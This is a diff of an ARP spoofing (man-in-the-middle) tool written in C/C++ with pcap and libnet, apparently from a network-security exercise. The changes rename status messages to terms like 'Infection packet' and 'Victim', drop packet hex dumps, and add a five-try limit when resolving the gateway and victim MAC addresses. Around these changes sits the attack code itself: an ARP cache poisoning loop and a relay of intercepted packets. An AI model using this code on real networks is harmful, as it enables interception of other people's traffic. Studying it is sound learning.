@@ -61,10 +61,8 @@ void packet_function(int p_type, u_int gateway_func_ip, pcap_t *handle_func, u_i
     }
 
     else{
-        for(int i = 0; i < (int)(sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr)); i++) printf("%02x ", function_buf[i]);
-
-        if(p_type == 1) std::cout<<"Send request gateway packet\n";
-        if(p_type == 2) std::cout<<"Send request sender packet\n";
+        if(p_type == 1) std::cout<<"Finding for Gateway MAC Address...\n";
+        if(p_type == 2) std::cout<<"Finding for Victim MAC Address...\n";
      }
 }
 
@@ -111,13 +109,9 @@ void *packet_handler(void *arg)
         if(RECOVERY_CHECK == 0) break;
 
         if(pcap_sendpacket(handle_th, (u_char*)send_buf, (sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr) + 18)) != 0)
-            std::cout<<"Arp packet error\n";
+            std::cout<<"Infection packet error\n";
 
-        else{
-            for(int i = 0; i < (int)(sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr) + 18); i++) printf("%02x ", send_buf[i]);
-
-            std::cout<<"Arp packet send\n";
-        }
+        else std::cout<<"Infection packet send\n";
 
         sleep(1);
     }
@@ -145,6 +139,7 @@ int main(int argc, char **argv)
 
     pcap_t *handle;
     libnet_t *libnet_l;
+    int find_count;
     char *dev, errbuf[PCAP_ERRBUF_SIZE];
     u_int victim_ip, gateway_ip, receiver_mac[6], sender_mac[6];
     u_int32_t attacker_ip;
@@ -181,6 +176,7 @@ int main(int argc, char **argv)
     gateway_ip = inet_addr(argv[2]);
 
     packet_function(1, gateway_ip, handle, attacker_ip, attacker_mac);
+    find_count = 0;
 
     while(1){
         const u_char *p_gateway;
@@ -192,14 +188,22 @@ int main(int argc, char **argv)
             if(arp_gwcheck->ar_sip == gateway_ip){
                 memcpy(receiver_mac, arp_gwcheck->ar_sha, 6);
 
-                std::cout<<"Find gateway mac address\n";
+                std::cout<<"Found the Gateway MAC Address!\n";
 
                 break;
             }
         }
+
+        find_count++;
+
+        if(find_count == 5){
+            std::cout<<"Gateway MAC Address Not found\n";
+            exit(1);
+        }
     }
 
     packet_function(2, victim_ip, handle, attacker_ip, attacker_mac);
+    find_count = 0;
 
     while(1){
         const u_char *p_sender;
@@ -216,10 +220,17 @@ int main(int argc, char **argv)
                 sender_mac[4] = arp_sdcheck->ar_sha[4];
                 sender_mac[5] = arp_sdcheck->ar_sha[5]; //memcpy(sender_mac, arp_sdcheck->ar_sha, 6);
 
-                std::cout<<"Find sender mac address\n";
+                std::cout<<"Found the Victim MAC Address!\n";
 
                 break;
             }
+        }
+
+        find_count++;
+
+        if(find_count == 5){
+            std::cout<<"Victim MAC Address Not found\n";
+            exit(1);
         }
     }
 
@@ -253,7 +264,7 @@ int main(int argc, char **argv)
                 memcpy(eth_check->ether_dhost, receiver_mac, 6);
                 memcpy(eth_check->ether_shost, virtual_mac, 6);
 
-                if(pcap_sendpacket(handle, (u_char*)p, h->len) != 0) std::cout<<"Relay error\n";
+                if(pcap_sendpacket(handle, (u_char*)p, h->len) != 0) std::cout<<"Relay packet send error\n";
 
                 else std::cout<<"Relay packet\n";
             }
@@ -286,9 +297,5 @@ int main(int argc, char **argv)
     if(pcap_sendpacket(handle, (u_char*)recovery_buf, (sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr) + 18)) != 0)
         std::cout<<"Recovery error\n";
 
-    else{
-        for(int i = 0; i < (int)(sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr) + 18); i++) printf("%02x ", recovery_buf[i]);
-
-        std::cout<<"Recovery arp cache\n";
-    }
+    else std::cout<<"Recovery arp cache\n";
 }
